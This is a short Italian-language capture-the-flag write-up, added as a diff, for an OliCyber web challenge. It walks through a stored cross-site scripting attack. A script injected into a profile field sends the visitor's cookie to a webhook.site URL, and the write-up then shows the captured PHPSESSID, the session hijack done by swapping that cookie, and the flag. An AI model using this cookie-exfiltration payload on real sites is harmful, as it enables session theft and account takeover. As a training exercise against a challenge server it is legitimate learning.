@@ -1,0 +1,45 @@
+
+copio un url su webhook.site e lo metto dentro questo scipt
+`<script>document.location='https://webhook.site/7d0fd009-0b68-404b-ae25-09e034d6b1b2?param='+document.cookie</script>`
+
+creo due accoutn alla chall in incognito
+link dei due profili:
+http://curious-george.challs.olicyber.it/index.php?id=95 verrà sacrificato
+http://curious-george.challs.olicyber.it/index.php?id=94 
+
+profilo1
+edit profile
+è vulnerabile perchè
+<script>alert(0)</script> ritorna 0
+quindi metto il mio script
+<script>document.location='https://webhook.site/7d0fd009-0b68-404b-ae25-09e034d6b1b2?param='+document.cookie</script>
+account morto
+
+profilo2
+report a bug
+>python3 pow.py 47d0cd
+Colliding stars...
+String: d52d9349a0ec3fd7f9803764178ac596baa552aa
+Hash: 47d0cd64927d9c749b2f2fe890c46266
+
+inserisco i risultati nella pagina report a bug 
+
+sono rientrata su webhook.site e ho preso il valore dopo l'uguale nella righiesta get nell'url
+``GET 	https://webhook.site/7d0fd009-0b68-404b-ae25-09e034d6b1b2?param=PHPSESSID=msi7dosr81bjrbkpk30cq0tchj
+Host 	5.75.232.207   Whois  Shodan  Netify  Censys
+Date 	09/01/2023 10:28:00 PM (18 minutes ago)
+Size 	0 bytes
+ID 	b79aee55-2d81-4e3b-b699-54af775c7be8```
+questo è quello che mi interessa: msi7dosr81bjrbkpk30cq0tchj
+
+sempre nel profilo2
+ispeziona
+storage
+cambio il valore del cookie con msi7dosr81bjrbkpk30cq0tchj
+
+riaccedo al link normale della chall in incognito http://curious-george.challs.olicyber.it
+
+flag{c00ki3s_4r3_d4Ng3r0uS_Wh3n_Th3y_m33t_XSS}
+
+
+
